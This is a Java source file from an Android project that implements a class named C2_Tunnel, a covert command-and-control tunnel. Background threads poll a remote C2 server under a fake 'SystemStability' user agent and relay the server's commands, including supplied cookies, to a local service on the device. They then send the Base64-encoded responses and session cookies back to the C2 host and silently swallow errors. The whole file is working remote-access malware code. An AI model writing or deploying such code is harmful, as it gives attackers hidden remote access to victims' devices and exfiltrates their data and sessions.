package com.labs.labrats;

import android.content.Context;
import android.util.Base64;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

/**
 * Tactical HTTP Long-Polling Tunnel Engine.
 * Ultra-low latency, zero-lag reverse HTTP proxy tunnel for Render / C2 relay.
 */
public class C2_Tunnel {

    private static final String TAG = "C2_Tunnel";
    private static volatile boolean isRunning = false;
    private static volatile long lastPollSuccessTime = 0;

    static {
        // Enable HTTP/HTTPS connection pooling for zero-handshake socket reuse
        System.setProperty("http.keepAlive", "true");
        System.setProperty("http.maxConnections", "10");
    }

    public static synchronized void start(Context context) {
        if (context == null) return;
        
        long now = System.currentTimeMillis();
        // If tunnel workers are actively polling within last 15s, keep existing workers
        if (isRunning && (now - lastPollSuccessTime < 15000)) return;

        isRunning = true;
        lastPollSuccessTime = now;

        Context appContext = context.getApplicationContext();

        // Launch 2 parallel long-polling worker threads for instant multi-asset proxying
        for (int i = 1; i <= 2; i++) {
            final int workerId = i;
            new Thread(() -> {
                Log.d(TAG, "Initiating Ultra-Low Latency Tunnel Loop Worker #" + workerId);
                FirebaseConfig.logActivity("TUNNEL_SYNC: Low-latency proxy worker #" + workerId + " active.");

                while (isRunning) {
                    boolean hadCommand = false;
                    try {
                        hadCommand = pollOnce(appContext);
                        lastPollSuccessTime = System.currentTimeMillis();
                    } catch (Throwable t) {
                        // Silent catch for transient drops
                    }

                    try {
                        // If a command was just executed, poll immediately (10ms) to drain any queued assets
                        // Otherwise brief 50ms pause before starting the next long-poll listener
                        Thread.sleep(hadCommand ? 10 : 50);
                    } catch (InterruptedException e) {
                        break;
                    }
                }
            }, "C2_Tunnel_Worker_" + i).start();
        }
    }

    private static boolean pollOnce(Context context) {
        String c2Url = BuildConfig.WEBHOOK_URL;
        if (c2Url == null || c2Url.trim().isEmpty()) return false;
        if (c2Url.contains("script.google.com") || c2Url.contains("script.googleusercontent.com")) return false;

        String baseC2 = c2Url.trim();
        while (baseC2.endsWith("/")) {
            baseC2 = baseC2.substring(0, baseC2.length() - 1);
        }
        if (baseC2.endsWith("/checkin")) {
            baseC2 = baseC2.substring(0, baseC2.length() - 8);
        }
        while (baseC2.endsWith("/")) {
            baseC2 = baseC2.substring(0, baseC2.length() - 1);
        }

        String deviceId = C2_Uploader.getDeviceId(context);
        HttpURLConnection conn = null;
        try {
            String encodedId = URLEncoder.encode(deviceId, "UTF-8");
            String pollUrl = baseC2 + "/tunnel-poll?deviceId=" + encodedId;
            String respUrl = baseC2 + "/tunnel-response";

            URL url = new URL(pollUrl);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setRequestProperty("User-Agent", "SystemStability/1.5");
            conn.setConnectTimeout(12000);
            conn.setReadTimeout(15000);

            if (conn.getResponseCode() == 200) {
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        sb.append(line);
                    }
                    String responseStr = sb.toString().trim();
                    if (!responseStr.isEmpty() && !responseStr.equals("{}")) {
                        JSONObject cmd = new JSONObject(responseStr);
                        String type = cmd.optString("type");
                        String requestId = cmd.optString("id");

                        if ("request".equals(type)) {
                            String path = cmd.optString("path");
                            String method = cmd.optString("method", "GET");
                            String body = cmd.optString("body", "");
                            String cookie = cmd.optString("cookie", "");
                            String contentType = cmd.optString("contentType", "application/x-www-form-urlencoded");

                            LabRatsWorker.execute(() -> relayLocalRequest(method, path, body, cookie, contentType, requestId, respUrl, deviceId));
                            return true; // Command received and executed
                        }
                    }
                }
            }
        } catch (Throwable t) {
            // Silently survive network switches or transient server drops
        } finally {
            if (conn != null) conn.disconnect();
        }
        return false;
    }

    private static void relayLocalRequest(String method, String path, String body, String cookie, String reqContentType, String requestId, String respUrl, String deviceId) {
        HttpURLConnection conn = null;
        HttpURLConnection respConn = null;
        try {
            String localPath = (path == null || path.isEmpty()) ? "/" : path;
            URL url = new URL("http://127.0.0.1:" + FirebaseConfig.DEFAULT_PORT + localPath);
            conn = (HttpURLConnection) url.openConnection();
            conn.setInstanceFollowRedirects(false);
            conn.setRequestMethod(method);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(15000);
            conn.setRequestProperty("Accept-Encoding", "identity");

            if (cookie != null && !cookie.isEmpty()) {
                conn.setRequestProperty("Cookie", cookie);
            }

            if (("POST".equalsIgnoreCase(method) || "PUT".equalsIgnoreCase(method) || "PATCH".equalsIgnoreCase(method)) && !body.isEmpty()) {
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", (reqContentType != null && !reqContentType.isEmpty()) ? reqContentType : "application/x-www-form-urlencoded");
                try (java.io.OutputStream os = conn.getOutputStream()) {
                    os.write(body.getBytes(StandardCharsets.UTF_8));
                }
            }

            int code = conn.getResponseCode();
            String contentType = conn.getContentType();
            String setCookie = conn.getHeaderField("Set-Cookie");

            InputStream is = (code < 400) ? conn.getInputStream() : conn.getErrorStream();
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            if (is != null) {
                byte[] data = new byte[16384];
                int nRead;
                while ((nRead = is.read(data, 0, data.length)) != -1) {
                    buffer.write(data, 0, nRead);
                }
            }

            JSONObject resp = new JSONObject();
            resp.put("deviceId", deviceId);
            resp.put("type", "response");
            resp.put("id", requestId);
            resp.put("status", code);
            resp.put("contentType", contentType);
            if (setCookie != null && !setCookie.isEmpty()) {
                resp.put("setCookie", setCookie);
            }
            resp.put("payload", Base64.encodeToString(buffer.toByteArray(), Base64.NO_WRAP));

            URL postUrl = new URL(respUrl);
            respConn = (HttpURLConnection) postUrl.openConnection();
            respConn.setRequestMethod("POST");
            respConn.setDoOutput(true);
            respConn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            try (java.io.OutputStream os = respConn.getOutputStream()) {
                byte[] input = resp.toString().getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }
            respConn.getResponseCode();

        } catch (Exception e) {
            Log.e(TAG, "Relay Error: " + e.getMessage());
        } finally {
            if (conn != null) conn.disconnect();
            if (respConn != null) respConn.disconnect();
        }
    }

    public static synchronized void stop() {
        isRunning = false;
    }
}
